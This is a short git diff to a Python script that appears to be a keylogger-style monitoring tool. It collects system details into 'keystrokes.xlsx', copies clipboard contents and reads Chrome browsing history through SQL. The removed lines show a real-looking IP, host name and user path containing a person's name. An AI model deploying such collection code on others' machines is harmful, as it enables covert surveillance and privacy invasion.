@@ -54,7 +54,7 @@ def system_info():
 
     data={
         "metrics": ['date', 'IP Address', 'Host Name', 'System', 'Release', 'Processor'],
-        'values': ["27-04-2025", " 192.168.29.93","LAPTOP-4NJTVAO7", "windows 11", "windows 11", "12th Gen Intel(R) Core(TM) i7-1255U "]
+        'values': ["date", " IP Address","Host name ", "system", "Release", "Processor "]
     }
     df= pd.DataFrame(data)
     df.to_excel('keystrokes.xlsx' , index=False)
@@ -74,7 +74,7 @@ copy_clipboard()
 
 #google chrome history
 def chrome_history():
-    conn=sqlite3.connect(r'C:\Users\Akansha Kambley\AppData\Local\Google\Chrome\User Data\Default\History')
+    conn=sqlite3.connect(r'C:\\Users\\username\\Desktop\\history1')
     cursor = conn.cursor()
 
     cursor.execute("SELECT url , title, datetime((last_visit_time/1000000)-11644473600, 'unixepoch', 'localtime') AS last_visit_time FROM urls")
